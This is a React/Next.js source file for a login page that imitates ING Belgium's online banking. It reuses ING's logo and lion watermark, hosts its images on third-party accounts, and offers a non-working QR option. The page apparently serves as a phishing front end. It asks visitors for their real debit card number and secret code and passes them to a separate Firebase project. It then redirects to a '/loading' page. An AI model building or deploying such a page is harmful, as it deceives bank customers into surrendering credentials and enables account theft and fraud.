"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Checkbox } from "@/components/ui/checkbox";
import { AlertTriangle, ChevronRight, Info, HelpCircle, QrCode, Smartphone, LoaderCircle } from "lucide-react";
import { useAuth } from "@/firebase";
import { signInWithEmailAndPassword } from "firebase/auth";

export default function LoginPage() {
  const router = useRouter();
  const auth = useAuth();
  const [loginMethod, setLoginMethod] = useState<'qr' | 'card'>('card');
  const [accountNumber, setAccountNumber] = useState("");
  const [secretCode, setSecretCode] = useState("");
  const [error, setError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Déconnecter l'utilisateur à l'arrivée sur la page
  useEffect(() => {
    localStorage.removeItem("isAuthenticated");
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsSubmitting(true);

    try {
      // Transformation du numéro de carte en email pour Firebase Auth
      const authEmail = `${accountNumber}@ing.be`;
      const authPassword = secretCode;

      await signInWithEmailAndPassword(auth, authEmail, authPassword);
      
      localStorage.setItem("isAuthenticated", "true");
      router.push("/loading");
    } catch (err: any) {
      console.error("Login error:", err);
      setError("Identifiants incorrects ou compte inexistant. Veuillez vérifier vos informations.");
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col relative bg-[#f4f4f4] overflow-x-hidden font-body">
      {/* Filigrane Lion 20% Visible via CSS */}
      <div className="watermark-lion">
        <Image 
          src="https://res.cloudinary.com/dlftfyudb/image/upload/v1773745069/Capture_d_%C3%A9cran_2026-03-17_104810_ovk3l7.png" 
          alt="ING Lion Filigrane" 
          width={700} 
          height={700} 
          className="object-contain"
          priority
        />
      </div>

      <header className="w-full p-4 sm:p-6 flex justify-between items-center z-10 max-w-7xl mx-auto">
        <div className="flex-1">
          <Image
            src="https://i.imgur.com/WWZ10oQ.png"
            alt="ING Logo"
            width={120}
            height={48}
            className="h-8 sm:h-10 w-auto"
          />
        </div>
        <div className="flex-1 flex justify-end gap-2 sm:gap-4 text-xs sm:text-sm font-bold text-gray-400">
          <button className="hover:text-primary transition-colors">NL</button>
          <span>|</span>
          <button className="text-primary underline decoration-2 underline-offset-4">FR</button>
          <span>|</span>
          <button className="hover:text-primary transition-colors">EN</button>
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center justify-start pt-4 sm:pt-8 px-3 sm:px-6 z-10 space-y-6 sm:space-y-8 w-full mb-12 sm:mb-20">
        {loginMethod === 'qr' ? (
          <Card className="w-full max-w-xl border border-gray-200 ing-card-shadow bg-white rounded-md overflow-hidden transition-all duration-300">
            <CardHeader className="pt-6 sm:pt-8 pb-3 sm:pb-4">
              <CardTitle className="text-lg sm:text-xl font-black text-[#ff6200] px-2 sm:px-4 text-center">
                Se connecter avec le code QR ING
              </CardTitle>
            </CardHeader>
            <CardContent className="px-4 sm:px-8 pb-6 sm:pb-8 text-sm">
              <div className="flex flex-col md:flex-row gap-6 items-start mb-6">
                <div className="flex-shrink-0 w-40 h-40 sm:w-48 sm:h-48 bg-gray-50 border border-gray-100 rounded-lg flex flex-col items-center justify-center relative overflow-hidden shadow-sm mx-auto md:mx-0">
                  <Image 
                    src="https://res.cloudinary.com/dlftfyudb/image/upload/v1773756428/t%C3%A9l%C3%A9charger_nlacn3.gif" 
                    alt="ING QR Code" 
                    fill
                    className="object-contain p-4"
                  />
                  <div className="absolute inset-0 bg-white/60 backdrop-blur-[2px] z-10 rounded-lg" />
                  <AlertTriangle className="h-10 w-10 sm:h-12 sm:w-12 text-[#ff6200] mb-3 z-20" />
                  <Button className="ing-btn-blue z-20 font-bold px-4 h-9 rounded-sm text-xs">
                    Réessayer
                  </Button>
                </div>
                <div className="flex-1 space-y-4 pt-2">
                  <ol className="list space-y-4">
                    <li className="list__item flex gap-3 items-start">
                      <div className="bg-primary text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 text-xs font-black mt-0.5">1</div>
                      <p className="text-[#333] font-medium leading-tight text-xs sm:text-sm">Ouvrez votre app ING Banking.</p>
                    </li>
                    <li className="list__item flex gap-3 items-start">
                      <div className="bg-primary text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 text-xs font-black mt-0.5">2</div>
                      <div className="text-[#333] flex items-center gap-2 font-medium leading-tight text-xs sm:text-sm">
                        Cliquez sur l'icône QR Code
                        <div className="bg-[#e6f2ff] p-1.5 rounded">
                          <QrCode className="h-5 w-5 text-[#0066cc]" />
                        </div>
                      </div>
                    </li>
                    <li className="list__item flex gap-3 items-start">
                      <div className="bg-primary text-white rounded-full w-6 h-6 flex items-center justify-center flex-shrink-0 text-xs font-black mt-0.5">3</div>
                      <p className="text-[#333] font-medium leading-tight text-xs sm:text-sm">Et scannez le code QR ING.</p>
                    </li>
                  </ol>
                </div>
              </div>
              <div className="flex items-center justify-start border-t border-gray-100 pt-4">
                <button className="flex items-center text-xs sm:text-sm font-bold text-[#0066cc] hover:underline gap-2">
                  Besoin d'aide?
                </button>
              </div>
            </CardContent>
          </Card>
        ) : (
          <Card className="w-full max-w-xl border border-gray-200 ing-card-shadow bg-white rounded-md transition-all duration-300">
            <CardHeader className="pt-6 sm:pt-8 pb-3 sm:pb-4">
              <CardTitle className="text-lg sm:text-xl font-black text-[#ff6200] px-2 sm:px-4 text-center">
                Identification par lecteur de carte ING
              </CardTitle>
            </CardHeader>
            <CardContent className="px-4 sm:px-8 pb-6 sm:pb-8">
              <div className="flex flex-col items-center mb-6">
                {/* Image du lecteur au-dessus - normal size */}
                <div className="bg-gray-50 p-4 rounded-lg border border-gray-100 shadow-inner mb-6">
                  <Image 
                    src="https://res.cloudinary.com/dlftfyudb/image/upload/v1773755068/Capture_d_%C3%A9cran_2026-03-17_114314_ceprzy.png" 
                    alt="Lecteur de carte ING" 
                    width={140} 
                    height={140}
                    className="object-contain"
                  />
                </div>
                
                <form onSubmit={handleLogin} className="space-y-4 w-full max-w-sm">
                  {error && (
                    <Alert variant="destructive" className="rounded-sm py-2 px-3 mb-4">
                      <AlertTriangle className="h-4 w-4" />
                      <AlertDescription className="text-xs font-bold ml-2">{error}</AlertDescription>
                    </Alert>
                  )}
                  <div className="space-y-1">
                    <Label htmlFor="cardNumber" className="text-[#333] font-bold text-sm">Numéro de carte de débit</Label>
                    <Input
                      id="cardNumber"
                      type="text"
                      className="h-10 text-sm bg-white border-gray-300 focus:border-primary rounded-sm shadow-none font-medium px-3"
                      required
                      value={accountNumber}
                      onChange={(e) => setAccountNumber(e.target.value)}
                    />
                  </div>
                  <div className="space-y-1">
                    <Label htmlFor="secretCode" className="text-[#333] font-bold text-sm">Code Secret / ING ID</Label>
                    <Input
                      id="secretCode"
                      type="password"
                      className="h-10 text-sm bg-white border-gray-300 focus:border-primary rounded-sm shadow-none font-medium px-3"
                      required
                      value={secretCode}
                      onChange={(e) => setSecretCode(e.target.value)}
                    />
                  </div>
                  <div className="flex items-center space-x-2 pt-1">
                    <Checkbox id="saveInfo" className="w-4 h-4 rounded-sm border-gray-300 data-[state=checked]:bg-primary data-[state=checked]:border-primary" />
                    <Label htmlFor="saveInfo" className="text-sm text-gray-600 font-medium cursor-pointer">Enregistrer ces informations</Label>
                  </div>
                </form>
              </div>

              <div className="ing-info-box p-4 rounded-r-md flex gap-3 items-start mb-6">
                <Info className="h-5 w-5 text-[#0066cc] mt-0.5 flex-shrink-0" />
                <div className="text-sm text-[#0066cc] font-medium leading-relaxed">
                  Utilisez votre numéro de carte et votre code secret réel pour accéder à votre espace sécurisé.
                  <a href="#" className="font-black underline ml-1 hover:text-[#004d99]">Plus d'infos</a>
                </div>
              </div>

              <div className="flex items-center justify-between border-t border-gray-100 pt-4">
                <button className="flex items-center text-sm font-bold text-[#0066cc] hover:underline gap-2">
                  <HelpCircle className="h-4 w-4" />
                  Aide
                </button>
                <Button 
                  onClick={handleLogin}
                  disabled={isSubmitting}
                  className="bg-[#ff6200] hover:bg-[#e05600] text-white font-black text-lg h-10 px-8 rounded-sm shadow-none transition-all active:scale-[0.98]"
                >
                  {isSubmitting ? <LoaderCircle className="h-5 w-5 animate-spin" /> : "Suivant"}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        <div className="w-full max-w-xl space-y-4">
          <h3 className="text-[#ff6200] font-black text-lg px-2 tracking-tight">Autres méthodes de connexion</h3>
          <Card className="border border-gray-200 ing-card-shadow bg-white rounded-md overflow-hidden">
            <CardContent className="p-0">
              <button className="w-full flex items-center justify-between px-6 py-4 hover:bg-gray-50 transition-colors border-b border-gray-100 group">
                <div className="flex items-center gap-4">
                  <div className="h-10 w-10 relative flex items-center justify-center bg-white rounded-full border border-gray-100 overflow-hidden shadow-sm">
                    <Image 
                        src="https://res.cloudinary.com/dlftfyudb/image/upload/v1773755603/Capture_d_%C3%A9cran_2026-03-17_114322_m5vzbi.png" 
                        alt="itsme" 
                        fill
                        className="object-cover p-1.5"
                    />
                  </div>
                  <span className="font-black text-[#333] text-lg">itsme</span>
                </div>
                <ChevronRight className="h-5 w-5 text-gray-300 group-hover:text-primary transition-all group-hover:translate-x-1" />
              </button>

              <button 
                onClick={() => setLoginMethod(loginMethod === 'qr' ? 'card' : 'qr')}
                className="w-full flex items-center justify-between px-6 py-4 hover:bg-gray-50 transition-colors group"
              >
                <div className="flex items-center gap-4">
                  <div className="h-10 w-10 flex items-center justify-center bg-white rounded-full border border-gray-100 shadow-sm transition-all group-hover:ring-2 group-hover:ring-primary/20">
                    {loginMethod === 'qr' ? (
                      <Smartphone className="h-6 w-6 text-primary" />
                    ) : (
                      <QrCode className="h-6 w-6 text-primary" />
                    )}
                  </div>
                  <span className="font-black text-[#333] text-lg">
                    {loginMethod === 'qr' ? 'ING Card Reader' : 'ING QR Code'}
                  </span>
                </div>
                <ChevronRight className="h-5 w-5 text-gray-300 group-hover:text-primary transition-all group-hover:translate-x-1" />
              </button>
            </CardContent>
          </Card>
        </div>
      </main>

      <footer className="w-full py-6 px-6 flex flex-wrap justify-center gap-x-8 gap-y-2 text-sm font-bold text-gray-400 z-10 bg-transparent">
        <a href="#" className="hover:text-primary transition-colors">Sécurité</a>
        <a href="#" className="hover:text-primary transition-colors">Vie Privée</a>
        <a href="#" className="hover:text-primary transition-colors">Règlements</a>
      </footer>
    </div>
  );
}
